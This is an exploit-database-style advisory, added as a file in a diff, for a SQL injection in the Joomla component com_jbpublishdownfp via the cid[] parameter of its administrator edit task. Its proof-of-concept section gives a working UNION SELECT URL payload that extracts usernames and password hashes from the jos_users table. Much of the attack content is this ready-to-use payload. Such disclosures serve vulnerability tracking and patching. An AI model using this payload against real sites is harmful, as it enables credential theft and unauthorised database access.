@@ -1,0 +1,30 @@
+[~]>> ...[BEGIN ADVISORY]...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> TITLE: Joomla (com_jbpublishdownfp) SQL Injection Vulnerability 
+[~]>> LANGUAGE: PHP
+[~]>> DORK: N/A
+[~]>> RESEARCHER: B-HUNT3|2
+[~]>> CONTACT: bhunt3r[at_no_spam]gmail[dot_no_spam]com
+[~]>> TESTED ON: LocalHost
+[~]>> PRE-REQUERIMENTS: Privileged user
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> DESCRIPTION: Input var cid[] is vulnerable to SQL Code Injection
+[~]>> AFFECTED VERSIONS: Confirmed in 1.4 but probably other versions also 
+[~]>> RISK: Low/Medium
+[~]>> IMPACT: Execute Arbitrary SQL queries
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> PROOFS OF CONCEPT:
+
+[~]>> http://[HOST]/[JOOMLA_PATH]/administrator/index.php?option=com_jbpublishdownfp&task=edit&cid[]=[SQL]
+[~]>> http://[HOST]/[JOOMLA_PATH]/administrator/index.php?option=com_jbpublishdownfp&task=edit&cid[]=-1+union+all+select+concat(username,0x3A3A3A,password)+from+jos_users
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> ...[END ADVISORY]...
+ 
